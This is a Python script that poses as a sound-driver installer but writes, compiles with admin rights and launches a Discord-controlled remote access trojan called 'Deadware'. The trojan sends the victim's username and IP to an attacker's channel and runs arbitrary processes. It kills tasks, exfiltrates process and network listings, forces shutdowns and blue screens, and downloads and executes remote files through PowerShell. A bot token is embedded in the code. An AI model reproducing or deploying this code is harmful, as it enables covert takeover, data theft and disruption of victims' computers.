from colorama import Fore, init
import os, time, getpass, pyautogui

user = getpass.getuser()

init()

os.chdir('C:\Program Files')

file = 'SystemSound.pyw'

os.system('cls')

print(f'{Fore.GREEN}[+]{Fore.WHITE} Installing sound drivers')
time.sleep(1)

os.system('cls')

with open(f'{file}' , 'a') as f:
    f.write('''
### IMPORTS ###
import ctypes
import asyncio
import datetime
from ipaddress import ip_address
import json
import os
import random
import string
from textwrap import dedent
from turtle import color
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from bs4 import BeautifulSoup as bs4
import discord
import requests
from PIL import Image
from colorama import Fore, init
from discord import Permissions
from discord.ext import commands
from discord.utils import get
import multiprocessing
from win32api import *
from win32gui import *
from win32con import *
from win32file import *
import getpass, pyautogui

def GetIP():
    ip = requests.get("https://api.ipify.org").text
    return ip

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

Deadware = commands.Bot(description='Deadware', command_prefix='d!', bot=True)
Deadware.remove_command('help')
loop = asyncio.get_event_loop()

@Deadware.event
async def on_ready():
    channel = Deadware.get_channel(935607961424887849) #CHANGE THIS
    user = getpass.getuser()
    embed = discord.Embed(title='[+] Deadware Connection!', description='You have a new connection', colour=RandomColor())
    embed.add_field(name=f'User: {user}', value='** **', inline=False)
    embed.add_field(name='IP: ' + GetIP(), value='** **', inline=False)

    await channel.send(embed=embed)

@Deadware.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@Deadware.command()
async def test_con(ctx):
    await ctx.message.delete()
    user = getpass.getuser()
    await ctx.send(f'Current Users: {user}')

@Deadware.command()
async def create_file(ctx, *, filename : str = None):
    await ctx.message.delete()
    if filename is None:
        await ctx.send('No file name given!')
    else:
        user = getpass.getuser()
        os.system(f"echo Hello there :) {user} > {filename}.txt")
        await ctx.send(f'Created file {filename}.txt')

@Deadware.command()
async def start_process(ctx, *, process):
    await ctx.message.delete()
    try:
        os.system(f'start {process}')
        await ctx.send(f'Started process {process}')
    except Exception:
        await ctx.send(f'Could not start {process}')

@Deadware.command()
async def computer_shutdown(ctx):
    await ctx.message.delete()
    try:
        os.system('shutdown /s')
        await ctx.send("Shutdown PC")
    except:
        await ctx.send('Could not shutdown computer')

@Deadware.command()
async def deadware_bomb(ctx):
    await ctx.message.delete()
    user = getpass.getuser()
    try:
        os.system(f'cd C://Users/{user}/Desktop & mkdir deadware')
        os.system(f'cd C://Users/{user}/Desktop/deadware & echo Hello there {user} > Note.txt')
        while True:
            os.system('start notepad.exe')
    except Exception:
        await ctx.send('Could not bomb computer')

@Deadware.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send('test_con - tests connection')
    await ctx.send('create_file - creates a file')
    await ctx.send('start_process - starts process')
    await ctx.send('computer_shutdown - shuts down computer')
    await ctx.send('deadware_bomb - messes with computer')
    await ctx.send('start_typing - opens notepad and types message')
    await ctx.send('get_ip - gets machine IP')
    await ctx.send('end_task - ends a task')
    await ctx.send('get_tasks - gets current processes running')
    await ctx.send('get_netstat - gets netstat output')
    await ctx.send('blue_screen - forces a temp BSOD')
    await ctx.send('error_drawing - starts cursor drawing')
    await ctx.send('upload - uplaods a file and runs it')
    await ctx.send('cwd - gets currenct working directory')
    await ctx.send('dir - lists folders in directory')
    await ctx.send('ext_search <file extention> - searches for file with extention')
    await ctx.send('change_dir <folder> - changes file directory')


@Deadware.command()
async def start_typing(ctx, *, msg):
    await ctx.message.delete()
    user = getpass.getuser()
    try:
        os.system('start notepad.exe')
        time.sleep(1)
        pyautogui.typewrite(msg)
        await ctx.send("Success")
    except Exception:
        await ctx.send('Could not start typing')

@Deadware.command()
async def get_ip(ctx):
    await ctx.message.delete()
    try:
        await ctx.send('IP: ' + GetIP())
    except Exception:
        await ctx.send('Could not get IP')

@Deadware.command()
async def end_task(ctx, *, task):
    await ctx.message.delete()
    try:
        os.system('taskkill /im ' + task + ' /f')
        await ctx.send(f'Stopped {task}')
    except Exception:
        await ctx.send(f'Could not stop {task}')

@Deadware.command()
async def get_tasks(ctx):
    await ctx.message.delete()
    try:
        os.system('tasklist > C://ProgramData/taskdata.txt')
        await ctx.send(file=discord.File(r'C://ProgramData/taskdata.txt'))
        os.remove('C://ProgramData/taskdata.txt')
    except Exception:
        await ctx.send('Could not list tasks')

@Deadware.command()
async def get_netstat(ctx):
    await ctx.message.delete()
    try:
        os.system('netstat -an > C://ProgramData/netstatdata.txt')
        await ctx.send(file=discord.File(r'C://ProgramData/netstatdata.txt'))
    except Exception:
        await ctx.send('Cannot get netstat')

@Deadware.command()
async def blue_screen(ctx):
    await ctx.message.delete()
    try:
        __import__("os").system("taskkill /F /IM svchost.exe")
        await ctx.send("Blue Screened!")
    except Exception:
        await ctx.send("Could not blue screen")

from random import randrange as rd
@Deadware.command()
async def error_drawing(ctx):
    await ctx.message.delete()
    try:
        IconWarning = LoadIcon(None, 32515)
        IconError  = LoadIcon(None, 32513)
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0)
        mouseX,mouseY = GetCaretPos()
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), IconWarning)
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos()
                DrawIcon(HDC, mouseX, mouseY, IconError)
                time.sleep(10)
    except Exception:
        await ctx.send("Could not do error drawing")

import subprocess
@Deadware.command()
async def upload(ctx, *, url, file_name):
    await ctx.message.delete()
    subprocess.call(f'C:\Windows\System32\powershell.exe Invoke-WebRequest -Uri {url} -OutFile .\{file_name}; .\{file_name}', shell=True)

@Deadware.command()
async def kill_deadware(ctx):
    await ctx.message.delete()
    try:
        await ctx.send('Stopped Deadware')
        exit()
    except Exception:
        await ctx.send('Could not stop Deadware')

@Deadware.command()
async def cwd(ctx):
    await ctx.message.delete()
    cwd = os.getcwd()
    await ctx.send(f'```{cwd}```')

import glob
@Deadware.command()
async def dir(ctx):
    directory = glob.glob('*/')
    await ctx.message.delete()
    for dirs in directory:
        await ctx.send(dirs)

@Deadware.command()
async def ext_search(ctx, *, ext):
    await ctx.message.delete()
    file_type = glob.glob(f'*{ext}')
    for files in file_type:
        await ctx.send(files)

@Deadware.command()
async def change_dir(ctx, *, dir):
    await ctx.message.delete()
    os.chdir(dir) 
    await ctx.send(f'Changed directory')

loop.create_task(Deadware.start('OTA5MDY4MDk3NDc3MDQ2MzAz.YY-5pA.xCnl8GuJL3EJHrVuR0OEs_ZXdU8')) #CHANGE THIS

try:
    loop.run_forever()
except:
    loop.stop()''')

os.system(f'pyinstaller {file} --onefile --uac-admin')
os.chdir('dist')
os.system(f'start {file}')
input("")